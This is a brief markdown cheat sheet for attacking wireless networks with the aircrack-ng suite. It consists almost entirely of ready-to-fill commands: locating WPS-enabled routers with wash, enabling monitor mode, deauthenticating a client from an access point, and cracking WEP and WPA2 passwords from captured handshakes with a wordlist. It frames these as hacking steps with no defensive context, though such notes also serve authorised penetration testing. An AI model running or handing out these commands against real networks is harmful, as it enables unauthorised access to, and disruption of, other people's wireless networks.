## Hacking wireless cheat sheet

### Discover the AP, ESSID, and BSSID of a device router with WPS enabled

```sh
wash -i [INTERFACE]
```

### airmon-ng

#### Kill any conflicting processes

```sh
airmon-ng check kill
```

#### Set monitor mode to an interface (create monitor mode virtualized adapter)

```sh
airmon-ng start [INTERFACE]
```

#### Wizard

```sh
airoscript-ng
```

#### De-authentication attack
De-authenticate and desassociate a client.

```sh
aireplay-ng --deauth 25 -h [TARGET MAC] -b [AP MAC] [INTERFACE]
```

#### Crack WEP password

```sh
aircrack-ng 'wireless-data-01.cap'
```

#### Crack WPA2 password

```sh
aircrack-ng -a2 -b [TARGET BSSID] -w dictionary.txt 'wireless-data-01.cap'
```
-a: Technique used to crack the handshake. 2=WPA technique.

-b: BSSID of the target router.

-w: Wordlist.


[<- Back to index](README.md)

---
## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`